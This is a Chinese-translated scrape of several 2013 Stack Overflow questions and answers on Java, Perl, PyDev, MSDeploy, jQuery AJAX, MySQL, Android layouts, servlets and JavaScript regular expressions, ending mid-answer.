我想 从 java 应用程序访问存储在 http 目录下的文件，例如： [http ://www.zen134237.zen.co.uk/。](http://www.zen134237.zen.co.uk/)假设服务器允许目录列表或者它在 FTP 上。有人能指出我正确的方向吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:14:18.187

您提到要访问 http 目录下的文件。你知道这个文件的位置吗？您可以使用 Java 的 net 包并打开一个 url 连接。然后从这个 url 连接中提取内容。

取自java教程：

[http://docs.oracle.com/javase/tutorial/networking/urls/readingWriting.html](http://docs.oracle.com/javase/tutorial/networking/urls/readingWriting.html)

```
import java.net.*;
import java.io.*;

public class URLConnectionReader {
    public static void main(String[] args) throws Exception {
        URL oracle = new URL("http://www.oracle.com/");
        URLConnection yc = oracle.openConnection();
        BufferedReader in = new BufferedReader(new InputStreamReader(
                                    yc.getInputStream()));
        String inputLine;
        while ((inputLine = in.readLine()) != null) 
            System.out.println(inputLine);
        in.close();
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:15:35.450

网络上有很多例子，所以我在这里只留下两个指针：

*   [编写 FTP 客户端](https://discursive.atlassian.net/wiki/display/CJCOOK/Writing+an+FTP+Client)
*   [Apache HttpClient - 教程](http://www.vogella.com/articles/ApacheHttpClient/article.html)

# perl - 如何在 perl 脚本中运行 perl 脚本 N 次

> ID：14220293
> 
> 赞同：-1
> 
> 时间：2013-01-08T17:05:04.413
> 
> 标签：perl

这是我正在使用的骨架脚本：

```
#!/usr/bin/env perl

=head1 NAME

webapp-1 harness - webapp-1 test

=head1 SYNOPSIS

    webapp-1 [OPTION]

    -v, --verbose  use verbose mode
    --help         print this help message

Where OPTION is an integer governing the number of times the script should be run

Examples:

    webapp-1 10 

=head1 DESCRIPTION

This is test harness to verify jira issue WEBAPP-1

=head1 AUTHOR

skahmed@mmm.com

=cut

use strict;
use warnings;

use Getopt::Long qw(:config auto_help);
use Pod::Usage;

my $count = $ARGV;

main();

sub main {

    # Argument parsing
    my $verbose;
    GetOptions(
        'verbose'  => \$verbose,
    ) or pod2usage(1);
    pod2usage(1)unless @ARGV;

    while ($count) {
    printf "$count \n";
    # Here i want to run a perl script N number of times, with N being the ARGV to this command
    # capture( [0,1,2, $^X, "yourscript.pl", @ARGS );
    $count++;
    }
} 
```

我也无法使用 IPC::System，因为我无法将它安装在我正在运行它的主机（ubuntu 12.04）上。我想做的是开发一个 perl 测试工具，它将运行 perl 脚本来运行进程、监视数据库表等，我还可以根据我从它们的执行中获得的结果来控制这些脚本的时间。

一种可能的解决方案：基于@ARGV 运行脚本 N 次

```
foreach (1..$ARGV[0])
    {
      print "hello \n";
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T20:58:42.820

您不需要 root 权限来安装 Cpan 模块。

`cpanm`接受`-l`安装到指定目录的选项，例如在`~/perl5/`.

然后在您的程序中使用`local::lib`模块指向`perl`您安装模块的位置。这很简单：

```
use local::lib '~/project/lib'; 
```

或者，如果您选择`~/perl5/`安装到，只需：

```
use local::lib; 
```

CpanMinus 和 CpanMinus`local::lib`都可以作为非 root 引导安装：

*   CpanMinus [http://cpanmin.us](http://cpanmin.us)
*   `local::lib`：[https ://metacpan.org/module/local::lib](https://metacpan.org/module/local%3a%3alib#The-bootstrapping-technique)

这些一起为您提供了 Cpan 的强大功能，而无需服务器的系统管理员的帮助。

# python - 如何为 PyDev 制作文件模板？

> ID：14220295
> 
> 赞同：3
> 
> 时间：2013-01-08T17:05:12.223
> 
> 标签：python, eclipse, pydev

我想在我创建的每个新文件的顶部都有一些关于许可证、作者等的样板信息，但我找不到要打勾的正确框。

基本上，我想创建一个新文件，并已将其填充（在顶部）

```
'''
   author: Me
   license: something
   copyright: something
''' 
```

这甚至可能吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-14T10:04:58.513

去`Windows -> Preferences -> PyDev -> Editor -> Templates`

创建一个新模板：

*   填写名称`<Empty>`
*   选择`Editor`
*   使能够`Automatically insert`
*   添加描述（可选）
*   在模式中复制您的模板
    *   您可能想在最后使用一些变量，例如`${year}`和`${cursor}`。

要在文件中添加模板：

只需按下`Ctrl+Space`空行或空格后选择`<Empty>`，它应该将您的模板添加到您的文件中。

注意：
您可以创建任意数量的`<Empty>`模板，当您输入一些字母后调用代码完成时，`<Empty>`模板不会显示。

# msdeploy - 如何在与 MSDeploy 一起使用的 Parameters.xml 中指定 IIS Web 应用程序名称

> ID：14220297
> 
> 赞同：22
> 
> 时间：2013-01-08T17:05:14.737
> 
> 标签：msdeploy

我发现了如何设置应用程序池和默认值

```
<parameter name="applicationPool" defaultValue="MyDefaultValue" >
  <parameterEntry kind="DeploymentObjectAttribute" scope="application"
                  match="application/@applicationPool" />
</parameter> 
```

有谁知道如何设置“IIS Web 应用程序名称”？它在 SetParameters.xml 文件中生成为

```
<setParameter name="IIS Web Application Name" value="Default Web Site/MySite_deploy" /> 
```

我可以覆盖SetParameters.xml文件，但是我宁愿在Parameters.xml文件中设置，但是找不到parameterEntry类型。

谢谢

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2013-01-10T11:30:52.823

您应该能够通过在`DeployIisAppPath`生成包时定义属性来覆盖存储在包中的默认值

或者，您可以声明`DisableAllVSGeneratedMSDeployParameter=true`，Visual Studio 将不再为您自动生成*任何*参数，您必须自己声明它们。

如果您自己声明网站参数，则*类型*将为`ProviderPath`. 范围将取决于`iisApp`或`contentPath`取决于正在使用的提供程序。撕开一个包并查看`archive.xml`文件，该值将是根清单元素的直接子元素。

# android - 和引擎：SVG - Android 顶点助手

> ID：14220299
> 
> 赞同：2
> 
> 时间：2013-01-08T17:05:18.097
> 
> 标签：android, svg, andengine

我正在制作一个需要使用 SVG 的游戏，但我无法弄清楚如何将自定义顶点（形状）分配给我的 SVG 图像的 Body。当我使用 pngs 而不是 SVG 时，我能够给出确切的顶点在 Android Vertices Helper 的帮助下的身体，但现在使用 Svgs，来自 AVhelper 的顶点给了我异常的结果。与它的图像相比，它实际上给了我一个非常大的身体。任何帮助将不胜感激。

# jquery - 如何使用 JQuery Ajax 请求发送多个参数？

> ID：14220304
> 
> 赞同：1
> 
> 时间：2013-01-08T17:05:24.220
> 
> 标签：jquery, asp.net, ajax

一个多星期以来，我问了一个关于[Jquery 和 Ajax](https://stackoverflow.com/questions/14105176/how-to-replace-partially-asp-net-page-with-a-jquery-ajax-request)的问题。我仍然不知道如何利用答案，因为我对此事还有更多问题。这是我的aspx页面。

```
<asp:ListView ID="_lsvCostFinder" runat="server" InsertItemPosition = "LastItem">
    <LayoutTemplate>
       <table>
        <tr>
          <th>Country</th>
          <th>City</th>
          <th>Cost(US$)</th>                
        </tr>
        <tr  runat="server" id="itemPlaceHolder">
        </tr>
       </table>
      </LayoutTemplate>
      <ItemTemplate>
       <tr>
         <td>
             <asp:LinkButton ID="_lnkDelete" runat="server" OnClick = "RemoveDestination">Delete</asp:LinkButton>
         </td>
         <td>
            <asp:DropDownList ID="_ddlCountry" runat="server" OnSelectedIndexChanged="ddlCountry_SelectedIndexChanged" AutoPostBack = "true">
               <asp:ListItem Value = "0">CANCEL..</asp:ListItem>
               <asp:ListItem Value = "1">USA</asp:ListItem>
               <asp:ListItem Value = "2">Germany</asp:ListItem>
               <asp:ListItem Value = "3">France</asp:ListItem>
               <asp:ListItem Value = "4">GB</asp:ListItem>
               <asp:ListItem Value = "5">Congo</asp:ListItem>
             </asp:DropDownList>
           </td>
           <td>
              <asp:DropDownList ID="_ddlCity" runat="server" OnSelectedIndexChanged="ddlCity_SelectedIndexChanged" AutoPostBack = "true" 
                        AppendDataBoundItems = "true" Width = "100">
                 <asp:ListItem Value = "0">CANCEL..</asp:ListItem>
                </asp:DropDownList>
            </td>
            <td>
                <asp:TextBox ID="_txtCost" runat="server" Width = "50" AutoPostBack = "true" OnTextChanged = "txtCost_TextChanged"></asp:TextBox>
            </td>
          </tr>
       </ItemTemplate>
       <InsertItemTemplate>
          <tr>
              <td style = "text-align: right; font-weight: bold;" colspan = "3">Total</td>
              <td style = "background-color: Silver; border: 2px solid black;">
                        <asp:Label ID="_lblTotal" Font-Bold ="true" runat="server"></asp:Label>
              </td>
            </tr>
          </InsertItemTemplate>
      </asp:ListView> 
        <br /><br />
      <asp:Button ID="_btnNewDestination" runat="server" Text="Add Destination" 
            onclick="_btnNewDestination_Click" /> 
```

回答我问题的人建议我使用以下 JQuery 代码：

```
$(document).ready(function () {//ready       
  $('select').change(function () {//select
    var id = $(this).attr('id');
    if (id.indexOf('_ddlCountry') != -1) {
       var nrow = id.match('\\d+');
       $.post('Default.aspx/ddlCountry_SelectedIndexChanged', { selectedVal: $(this).val() }, function (data) {                  
          $(this).parents('tr').replaceWith('<tr><td colspan="3"><div>' + $(this).val() + '</div></td></tr>');
           });
          }
        }); //select
   });//ready 
```

还要更改签名，使方法看起来像这样

```
[WebMethod]
public static string MethodName(string selectedVal)
{
 return "something";
} 
```

从方法的签名中，我得出结论，Jquery ajax 请求只发送了 1 个参数。我不想只发送 1 个参数。我要发送3，即第一个下拉列表的值，第二个下拉列表的值，文本框的值。

如何通过 ajax 请求发送多个值？

感谢 s 的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:16:59.920

您可以发布任意数量的参数

```
$.post('Default.aspx/ddlCountry_SelectedIndexChanged', 
 { param1_name: param1_val, param2_name: param2_val, param3_name:param3_val }, 
 function (data) {                  
      $(this).parents('tr').replaceWith('<tr><td colspan="3"><div>' + $(this).val() + '</div></td></tr>');
       });
      }
    }); 
```

见 $.post 文档[文档](http://api.jquery.com/jQuery.post/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:08:56.460

要通过 AJAX 请求发送多个值，您只需向参数对象添加更多元素。要更深入地了解 $.post 方法的作用和传递的函数参数，请查看[文档](http://api.jquery.com/jQuery.post/)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-08T17:13:53.067

```
 $.post('Default.aspx/ddlCountry_SelectedIndexChanged', 
      { selectedVal: $(this).val() , anotherParameter: 'a value'}, 
      function (data) {                  
        $(this).parents('tr').replaceWith('<tr><td colspan="3"><div>' + $(this).val() + '</div></td></tr>');
       }); 
```

我不了解 ASP，但我认为你只需要添加这样的参数：

```
public static string MethodName(string selectedVal, string anotherParameter)
{
 return "something";
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-08T17:14:01.053

您调用的第二个参数[`post`](http://api.jquery.com/jQuery.post/)是与调用关联的数据：

```
 $.post('Default.aspx/ddlCountry_SelectedIndexChanged', { selectedVal: $(this).val() }, function (data) {                  
      $(this).parents('tr').replaceWith('<tr><td colspan="3"><div>' + $(this).val() + '</div></td></tr>');
   }); 
```

`{ selectedVal: $(this).val() }`这只是与您的通话一起传递的一个对象。为了传递更多值，您可以像这样内联添加它们：

`{ selectedVal: $(this).val(), selectedVal2: "Value2", selecetedValue3: "Value3" }`

或在调用之前创建一个对象：

```
var parameters = {
 selectedVal: $(this).val(),
 selectedVal2: "Value2", //insert the values you want here
 selecetedValue3: "Value3" //insert the values you want here 
}; 
```

这会将您的[`post`](http://api.jquery.com/jQuery.post/)电话更改为：

```
 $.post('Default.aspx/ddlCountry_SelectedIndexChanged', parameters, function (data) {                  
      $(this).parents('tr').replaceWith('<tr><td colspan="3"><div>' + $(this).val() + '</div></td></tr>');
   }); 
```

然后，您需要确保您的调用接受并相应地处理这三个参数。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-08T17:21:42.150

你最终会得到这样的东西：

```
[WebMethod]
public static string MethodName(string param1, string param2, string param3)
{
    return "something";
} 
```

在客户端，这将改变：

```
 $(document).ready(function () {//ready       
      $('select').change(function () {//select
     var id = $(this).attr('id');
     if (id.indexOf('_ddlCountry') != -1) {
     var nrow = id.match('\\d+');
     $.post('Default.aspx/ddlCountry_SelectedIndexChanged', { param1: $(this).val(), param2: 'something', param3: 'something else' }, function (data) {                  
      $(this).parents('tr').replaceWith('<tr><td colspan="3"><div>' + $(this).val() + '</div></td></tr>');
       });
      }
    }); //select
    });//ready 
```

**但请不要那样做**

正如我在您的代码中看到的那样，您刚刚开始使用 Jquery 和 ASP 进行 ajax。

现在您正在对您的服务器进行“低级”调用，如果您想发送和接收复杂的数据，这种制作 ajax 的方式只会给您带来噩梦。

有一种叫做 JSON 的东西，你离实现它只有一步之遥

查看本教程： [http ://www.ezzylearning.com/tutorial.aspx?tid=5869127](http://www.ezzylearning.com/tutorial.aspx?tid=5869127)

如果您有任何问题，我可以发布一个示例“复杂”ajax Web 服务调用。

# mysql - mysql - 从结果中选择

> ID：14220306
> 
> 赞同：1
> 
> 时间：2013-01-08T17:05:26.250
> 
> 标签：mysql, select, phpmyadmin

我有一张桌子

```
scores(user, score) 
```

我有这个查询

```
SET @row_num = 0; 
SELECT @row_num := @row_num + 1 as row_index, user, score 
FROM scores ORDER BY score DESC 
```

现在我想从这个查询结果中选择名称为“john”且得分为“1400”的用户，以了解他的 row_index 是什么，类似于

```
SELECT row_index 
FROM *result* WHERE user='john' AND score=1400 
```

我怎么做？我试过

```
SET @row_num = 0; 
SELECT row_index 
FROM (SELECT @row_num := @row_num + 1 as row_index, user, score 
      FROM scores ORDER BY score DESC)      
WHERE user='john' AND score=1400` 
```

但 phpMyAdmin 说

```
#1248 - Every derived table must have its own alias 
```

我怎样才能做到这一点？

谢谢你，亚历山德罗

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:06:53.590

您尚未向派生表添加别名。

```
SELECT row_index FROM (...) AS alias
WHERE alias.user = 'john' AND alias.score = 1400 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-08T17:10:51.660

询问：

```
SET @row_num = 0; 
SELECT a.row_index 
FROM (SELECT @row_num := @row_num + 1 as row_index, 
             user, 
             score 
             FROM scores ) a
WHERE a.user='john' AND a.score=1400
ORDER BY a.score DESC 
```

我认为子查询中的排序并不总是允许的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-08T17:10:51.497

尝试使用[视图](http://dev.mysql.com/doc/refman/5.0/en/create-view.html)。

```
SET @row_num = 0; 
CREATE VIEW v AS SELECT @row_num := @row_num + 1 as row_index, user, score FROM scores ORDER BY score DESC;
SELECT row_index FROM v; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-08T17:31:39.220

试试这个：

```
SET @row_num = 0; 

SELECT row_index FROM (SELECT @row_num := @row_num + 1 as row_index, user, 
score FROM scores ORDER BY score DESC) AS alias1 WHERE user='john' AND score=1400 
```

# android - 我想在EditText中设置行的整个宽度的背景颜色

> ID：14220310
> 
> 赞同：0
> 
> 时间：2013-01-08T17:05:34.857
> 
> 标签：android, colors, textview, android-edittext, line

我有一个带有多行文本的 EditText 框。我想将一些线条设置为背景颜色蓝色。我想将 EditText 框的整个宽度设置为蓝色，而不仅仅是文本的背景。

请帮忙！

（我知道我可以通过使用 Span 类将文本的背景设置为蓝色，但想在整个行的宽度上设置蓝色 - 即使文本只存在到行的中间）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T17:09:21.300

您可以使用以下 xml 布局自定义编辑文本

将以下代码另存为`yourWishName.xml`

```
<?xml version="1.0" encoding="UTF-8"?>
<selector
xmlns:android="http://schemas.android.com/apk/res/android">

//You can change the color of the edit text here which removes the border line as well
 <item android:state_focused="true" >
    <shape android:shape="rectangle">
        <gradient
            android:startColor="#FFFFFF"
            android:endColor="#FFFFFF"
            android:angle="270" />
        <stroke
            android:width="3dp"
            android:color="#F8B334" />
        <corners
            android:radius="12dp" /> 
    </shape>
</item>  
<item>
    <shape android:shape="rectangle">
        <gradient
            android:startColor="#FFFFFF"
            android:endColor="#FFFFFF"
            android:angle="270" />
        <stroke
            android:width="0dp"
            android:color="#000000" />
        <corners
            android:radius="12dp" /> 
    </shape>
</item>
</selector> 
```

在 EditText 中调用 xml`android:background="@drawable/yourWishName"`

希望这可以帮助

# javascript - 需要从 servlet 有条件地打开一个额外的窗口

> ID：14220315
> 
> 赞同：4
> 
> 时间：2013-01-08T17:05:52.853
> 
> 标签：javascript, forms, servlets, redirect, window

在找到此解决方案后，我以为我已经解决了我之前发布的一个问题：[Javascript Post on Form Submit open a new window](https://stackoverflow.com/questions/178964/javascript-post-on-form-submit-open-a-new-window)。但是，它并不能完全满足我的要求，而且我无法弄清楚缺少什么。

这是问题所在...我有一个带有表单的jsp。提交表单时（通过 JavaScript），我希望父窗口始终重定向到另一个页面。但是，根据用户的输入值，我也有条件地想要打开另一个窗口并将那个窗口重定向到不同的页面。因此，始终重定向父级，有时打开并重定向子级。

我在jsp中的代码：

```
<script>
  function handleFormSubmit() {
    var form = document.getElementById("myForm");
    ...
    if (checkbox.checked) {
      // this code creates the child window, but ONLY if the checkbox is checked
      myForm.setAttribute("target", "newResultPage");
      window.open("childpage.jsp", "newResultPage", "width=850,height=550,...");
    }

    form.submit();
  }
</script> 
```

这是html表单：

```
<form id='myForm' method='post' action='someAction' accept-charset='UTF-8'>
 // some hidden input elements here
</form> 
```

和 servlet 逻辑：

```
public class MyServlet extends HttpServlet {

  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String redirectedPage = "/parentPage";

    if (someCondition) {
      redirectedPage = "/childpage.jsp";
    }

    RequestDispatcher reqDispatcher = getServletConfig().getServletContext().getRequestDispatcher(redirectedPage);
    reqDispatcher.forward(request,response);
  }
} 
```

当条件不满足时，一切正常。servlet 被调用，调用页面被重定向到 parentPage。但是，如果满足条件，则 servlet 会在新的子窗口中正确打开 childpage.jsp，但不会将调用方页面重定向到 parentPage。

我尝试添加显式***重定向（“parentPage.jsp”）；***在***form.submit() 之后；***，但这会产生竞争条件并且不是一个好的解决方案，因为在提交表单后不应调用任何内容。

我还尝试修改 servlet 内部的逻辑，并且仅在检测到条件时才重定向。但是，当条件不存在时，这会导致问题，因为 servlet 不知道接下来将用户发送到哪里。

有没有办法让我将多个表单传递给一个 servlet 并通过 Java 处理它？任何帮助将不胜感激。

-鲍勃

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-09T16:55:08.883

在发布问题几个小时后，我自己弄清楚了这一点，但想在回信之前确保解决方案有效。

我认识到根据我的逻辑，我总是会重定向“父”页面。因此，我没有尝试从原始 servlet 打开子窗口，而是将该逻辑移至父页面并使用 onload 函数（有条件地）启动它。这是澄清的更新代码：

更新的jsp代码：

```
<script>
  function handleFormSubmit() {
    var form = document.getElementById("myForm");
    ...
    if (checkbox.checked) {
      // we pass an additional parameter that will make its way to the new parent page
      myForm.setAttribute("launchNow", "1");

      /*
       * this code no longer applies
       */
      // myForm.setAttribute("target", "newResultPage");
      // window.open("childpage.jsp", "newResultPage", "width=850,height=550,...");
    }

    form.submit();
  }
</script> 
```

Html 表单代码（没有改变！）：

```
<form id='myForm' method='post' action='someAction' accept-charset='UTF-8'>
 // some hidden input elements here
</form> 
```

更新的 servlet 逻辑：

```
public class MyServlet extends HttpServlet {

  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String redirectedPage = "/parentPage";

    String launchNow = request.getParameter("launchNow");

    if (someCondition) {

      /*
       * Rather than redirecting, we pass an additional params to the new parent page
       */
      // redirectedPage = "/childpage.jsp";

       request.setAttribute("launchNow", launchNow);
       request.setAttribute("anotherParam", someValue);
    }

    RequestDispatcher reqDispatcher = getServletConfig().getServletContext().getRequestDispatcher(redirectedPage);
    reqDispatcher.forward(request,response);
  }
} 
```

最后，在新的父 jsp 页面中，我们检查附加参数并采取相应措施：

```
<html>
  <head></head>

  <%
    String launchNow    = request.getParameter( "launchNow" );
    String anotherParam = request.getParameter( "anotherParam" );
  %>

  <body onload="loadOnLaunch(<%= launchNow %>)">
    <form id="hiddenForm" method="post" target="newResultPage" action="anotherAction">
      <input id='anotherParam' type='hidden' name='anotherParam' value='<%= anotherParam %>'/>
    </form>

    <script type='text/javascript'>

      function loadOnLaunch(launchNow) {
        if (launchNow != null && launchNow == "1") {

          /*
           * NOTE: that this block used to reside in the original parent form!
           * It stayed the same, but the action getting called is different
           * thus invoking a different servlet
           */
          var myForm = document.getElementById("hiddenForm");
          myForm.setAttribute("target", "newResultPage");
          window.open("childpage.jsp", "newResultPage", "width=850,height=550,...");
        }
      }

    </script>
    ...
  </body>
</html> 
```

# android - Android：透明背景自动替换为随机图像

> ID：14220316
> 
> 赞同：1
> 
> 时间：2013-01-08T17:05:55.273
> 
> 标签：android, android-layout

我正在尝试我的应用程序的一种奇怪行为：所有透明背景都被随机图像替换。这是一个例子（对不起大尺寸）：

![在此处输入图像描述](../Images/9ab1d2b9a1c269a29959169668caf0ce.png)

这是一个在中心有一个 RelativeLayout 的活动（具有透明背景），其中包含一个 listView（每个单元格都有透明背景）。您可以看到这个巨大的注销图像替换了所有透明背景。此图像用于完全不同的布局，根本不会出现在活动布局的 xml 文件中。这个问题只存在于（据我所知）三星 Galaxy Note（我全心全意地讨厌它），并且它在我使用的所有其他设备以及模拟器中都可以正常运行。我已经清理了项目，重新安装了应用程序以及我所知道的所有其他故障排除初步做法。

有人知道发生这种情况的原因吗？

这是xml文件：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="@drawable/io_guido_background" >

    <!-- header -->

    <RelativeLayout
        android:id="@+id/headerlayout"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:background="@drawable/pezzo_bar"
        android:gravity="top" >

        <ImageView
            android:id="@+id/header"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentRight="true"
            android:layout_alignParentTop="true"
            android:scaleType="fitStart"
            android:src="@drawable/logo_bar" />

        <TextView
            android:id="@+id/titolo"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_alignParentLeft="true"
            android:layout_marginLeft="30dp"
            android:layout_marginTop="10dp"
            android:gravity="left|top"
            android:text="Archivio"
            android:textColor="@color/white"
            android:textSize="16dp"
            android:textStyle="bold" />
    </RelativeLayout>

    <!-- body -->

    <RelativeLayout
        android:layout_width="fill_parent"
        android:layout_height="fill_parent"
        android:layout_below="@+id/headerlayout" >

        <RelativeLayout
            android:layout_width="fill_parent"
            android:layout_height="480dp"
            android:layout_centerInParent="true"
            android:orientation="vertical" >

            <!-- box date -->

            <RelativeLayout
                android:id="@+id/sceltadate"
                android:layout_width="fill_parent"
                android:layout_height="wrap_content"
                android:layout_alignParentTop="true"
                android:background="@drawable/io_guido_rect_2" >

                <ImageView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_marginTop="4dp"
                    android:background="@drawable/io_guido_periodo"
                    android:scaleType="fitStart" />

                <LinearLayout
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignParentTop="true"
                    android:layout_centerHorizontal="true"
                    android:layout_marginTop="50dp"
                    android:orientation="horizontal" >

                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="Da: "
                        android:textColor="@color/black" />

                    <Button
                        android:id="@+id/dabtn"
                        android:layout_width="100dp"
                        android:layout_height="wrap_content"
                        android:background="@drawable/textedit_state"
                        android:onClick="setData" />

                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:layout_marginLeft="40dp"
                        android:text="A: "
                        android:textColor="@color/black" />

                    <Button
                        android:id="@+id/abtn"
                        android:layout_width="100dp"
                        android:layout_height="wrap_content"
                        android:background="@drawable/textedit_state"
                        android:onClick="setData" />
                </LinearLayout>
            </RelativeLayout>
            <!--  -->

            <!-- body lista -->

            <RelativeLayout
                android:id="@+id/body"
                android:layout_width="fill_parent"
                android:layout_height="338dp"
                android:layout_above="@+id/legenda"
                android:layout_below="@+id/sceltadate"
                android:layout_margin="10dp" >

                <RelativeLayout
                    android:id="@+id/subbody"
                    android:layout_width="fill_parent"
                    android:layout_height="fill_parent"
                    android:layout_above="@+id/backgroung"
                    android:background="#f3f3f3" >
                </RelativeLayout>

                <ImageView
                    android:id="@+id/backgroung"
                    android:layout_width="fill_parent"
                    android:layout_height="wrap_content"
                    android:layout_alignParentBottom="true"
                    android:background="@drawable/io_guido_rect_3_new" />

                <!-- logo

                <ImageView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignParentBottom="true"
                    android:layout_alignParentRight="true"
                    android:layout_marginBottom="30dp"
                    android:layout_marginRight="10dp"
                    android:scaleType="fitStart"
                    android:src="@drawable/logo_trasparente" />
                 fine logo -->

                <!-- lista -->

                <LinearLayout
                    android:id="@+id/layoutlista"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:orientation="vertical" >

                    <ListView
                        android:id="@id/android:list"
                        android:layout_width="fill_parent"
                        android:layout_height="fill_parent"
                        android:layout_marginBottom="10dp"
                        android:background="@color/transparent"
                        android:cacheColorHint="@color/transparent" >
                    </ListView>
                </LinearLayout>

                <!-- sfondoTop -->
            </RelativeLayout>

            <!-- fine bodyLista -->

            <!-- body legenda -->

            <LinearLayout
                android:id="@+id/legenda"
                android:layout_width="fill_parent"
                android:layout_height="50dp"
                android:layout_alignParentBottom="true"
                android:layout_marginBottom="15dp"
                android:gravity="center_horizontal"
                android:orientation="horizontal" >

                <!-- Prenotata -->

                <LinearLayout
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:gravity="center"
                    android:orientation="vertical"
                    android:paddingRight="10dp" >

                    <ImageView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:src="@drawable/ready" />

                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="Prenotata"
                        android:textColor="@color/black" />
                </LinearLayout>

                <!-- In corsa -->

                <LinearLayout
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:gravity="center"
                    android:orientation="vertical" >

                    <ImageView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:src="@drawable/pronta" />

                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="In corsa"
                        android:textColor="@color/black" />
                </LinearLayout>

                <!-- terminata -->

                <LinearLayout
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:gravity="center"
                    android:orientation="vertical"
                    android:paddingLeft="10dp" >

                    <ImageView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:src="@drawable/ok" />

                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="Terminata"
                        android:textColor="@color/black" />
                </LinearLayout>

                <!-- Annullata -->

                <LinearLayout
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:gravity="center"
                    android:orientation="vertical"
                    android:paddingLeft="10dp" >

                    <ImageView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:src="@drawable/x" />

                    <TextView
                        android:layout_width="wrap_content"
                        android:layout_height="wrap_content"
                        android:text="Annullata"
                        android:textColor="@color/black" />
                </LinearLayout>
            </LinearLayout>
            <!-- fine body legenda -->

        </RelativeLayout>
    </RelativeLayout>
    <!-- fine body -->

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:55:36.970

您是否尝试过专门为这种设备创建特殊布局？前段时间我遇到了类似的问题，通过使用此设备的屏幕规格创建新布局来解决。

发生这种情况的原因是，当您创建默认布局时，它被创建用于中等屏幕密度。当您在更高密度的屏幕上运行应用程序时，Android 会尝试将布局填充到屏幕尺寸和密度。如果 Android 知道背景与屏幕密度不匹配，它会尝试使用其他方式填充背景。众所周知，为您要支持的每个密度创建布局是一种很好的做法。IE，正常（mdpi），高（hdpi）和低（ldpi）。

在运行时，系统通过以下过程为任何给定资源确保当前屏幕上的最佳显示：

资源是那些没有用配置限定符标记的。例如drawable/中的资源就是默认的drawable资源。系统假定默认资源是为基线屏幕尺寸和密度设计的，即正常屏幕尺寸和中等密度。因此，系统会酌情为高密度屏幕向上缩放默认密度资源，为低密度屏幕向下缩放。但是，当系统在寻找特定密度的资源时，在特定密度的目录中没有找到它，它不会总是使用默认资源。系统可以改为使用其他特定于密度的资源之一，以便在缩放时提供更好的结果。例如，在寻找低密度资源并且它不可用时，系统更喜欢缩小资源的高密度版本，因为与缩放中等密度资源相比，系统可以轻松地将高密度资源缩小到低密度 0.5 倍，而且工件更少0.75 倍。...”（developer.android.com/guide/practices/screens_support.html）

要深入了解Android如何选择资源可以查看这个主题：[Android如何找到最佳匹配资源](http://developer.android.com/guide/practices/screens_support.html)

希望这有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-23T15:03:43.890

我遇到了同样的问题。可以通过替换来修复`android:background="@color/transparent"`它`android:background="@null"`。它可能是三星平板电脑特有的（在 Galaxy 标签上看到）。

# javascript - 将字符串转换为正则表达式

> ID：14220319
> 
> 赞同：1
> 
> 时间：2013-01-08T17:06:03.053
> 
> 标签：javascript, regex

如何检查 JavaScript 字符串是否为 RegExp 格式，然后将其转换为 RegExp？

我找到了一种使用 RegExp 的方法，但规则太复杂而无法正确处理。

```
function str2Regex(str){
  var rule = /\/(\\[^\x00-\x1f]|\[(\\[^\x00-\x1f]|[^\x00-\x1f\\\/])*\]|[^\x00-\x1f\\\/\[])+\/([gim]*)/;
  var match = str.match(rule);
  return match ? new RegExp(match[1],match[3]) : str;
} 
```

* * *

现在我正在使用`/\/(.*)\/(?=[igm]*)([igm]*)/`哪个有效。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:08:01.243

最简单的方法，也可能是最正确的方法是使用 try/catch ：

```
try {
